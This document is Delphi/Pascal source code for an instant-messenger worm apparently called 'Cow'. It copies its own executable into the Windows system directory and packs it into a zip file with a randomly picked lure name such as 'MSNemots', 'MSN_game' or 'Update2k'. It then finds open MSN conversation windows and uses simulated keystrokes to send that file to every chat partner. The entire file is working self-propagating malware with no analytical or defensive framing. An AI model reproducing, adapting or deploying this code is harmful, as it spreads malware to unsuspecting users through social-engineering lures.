   program Cow;
   uses
     Windows, Zip,
     Sendkey in 'Sendkey.pas';

   var
     wins:array[0..300]of record name:string;
     wnd:hwnd;
     end;
     wcnt:integer=0;
     win:String;
     Buf:Array[0..36360]of Char;
     Sys:string;
     Emot:String;
     d   :IntegeR;

   function enumwinproc(w:hwnd;lpr:lparam):boolean;stdcall;
   begin

     if iswindowvisible(w) then begin
       getwindowtext(w,buf,10000);
       if buf[0]<>#0 then begin
         wins[wcnt].name:=buf;
         wins[wcnt].wnd:=w;
         wcnt:=wcnt+1;
       end;
     end;
     result:=true;
   end;

   function sendwindows:string;
   var i:integer;
   begin
    result:='';
     wcnt:=0;
     enumwindows(@enumwinproc,0);
     for i:=0 to wcnt-1 do begin
       result:=result+{'['+inttostr(wins[i].wnd)+']'+}wins[i].name+chr(13);
       wins[i].name := '';
       wins[i].wnd := 0;
     end;
   end;

   function getwins:string;
   begin
    result:='';
    result:=sendwindows;
   end;

   begin

   GetSystemDirectory(Buf, 255);
   Sys := Buf;
   ZeroMemory(@Buf, SizeOf(Buf));
   Sys := Sys + '\'; //cow2k.tmp';

   Randomize;
   Case Random(8) Of
    0:Emot := 'MSNemots';
    1:Emot := 'MSNicons';
    2:Emot := 'MSN_game';
    3:Emot := 'MSN-chat';
    4:Emot := 'MS_510A3';
    5:Emot := 'Update2k';
    6:Emot := 'Updt2004';
    7:Emot := 'MSN-hack';
   End;

   CopyFile(pChar(ParamStr(0)), pChar(Sys+'cow2k.tmp'), False);

   zip_make(Sys+'cow2k.tmp', Sys+emot+'.zip', emot+'.exe');

   Emot := Sys + Emot + '.zip';

   Win := GetWins;
    While Win <> '' Do Begin
     Sys := Copy(Win, 1, Pos(#13, Win)-1);

     If Pos('onversation', Sys)>0 Then Begin
      MakeWindowActive(GetHandleFromWindowTitle(Sys));
      Sleep(1000);
      SendKeys(SK_ALT_DN+'FF'+SK_ALT_UP);
      Sleep(400);
      SendKeys(EMOT);
      SendKeys(SK_ENTER);
     End;

     Win := Copy(Win, Pos(#13, Win)+1, Length(Win));
    End;

   end.
